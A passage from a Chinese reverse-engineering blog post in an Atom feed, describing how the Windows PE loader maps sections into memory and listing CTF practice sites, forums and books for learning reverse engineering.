header尾部的是节表。PE装载器执行完第二步后开始读取节表中的节段信息，并采用文件映射（在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系）的方法将这些节段映射到内存，同时附上节表里指定节段的读写属性。</p><p>PE文件映射入内存后，PE装载器将继续处理PE文件中类似 import table （输入表）的逻辑部分<br>这四个步骤便是PE文件的执行顺序，具体细节读者可以参考相关文档。</p><h1 id="学习途径"><a href="#学习途径" class="headerlink" title="学习途径"></a>学习途径</h1><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="external">https://github.com/scwuaptx/HITCON-Training</a><br><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="external">https://www.jarvisoj.com/challenges</a><br><a href="https://betamao.me/challenges" target="_blank" rel="external">https://betamao.me/challenges</a><br><a href="http://ctf.nuptzj.cn/challenges#" target="_blank" rel="external">http://ctf.nuptzj.cn/challenges#</a></p><h2 id="各种论坛"><a href="#各种论坛" class="headerlink" title="各种论坛"></a>各种论坛</h2><p>看雪 www.pediy.com<br>吾爱破解 www.52pojie.cn</p><h2 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍:"></a>推荐书籍:</h2><p>逆向工程核心原理<br>加密与解密<br>IDA Pro权威指南（第2版）<br>C++反汇编与逆向分析技术揭秘</p><h2 id="只想说，需要耐心。多百度-多逛博客，多认识点大师傅"><a href="#只想说，需要耐心。多百度-多逛博客，多认识点大师傅" class="headerlink" title="只想说，需要耐心。多百度,多逛博客，多认识点大师傅"></a>只想说，需要耐心。多百度,多逛博客，多认识点大师傅</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RE的一些基础,逆向题目，需要大胆猜测。接下来就是小心验证。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
</feed>
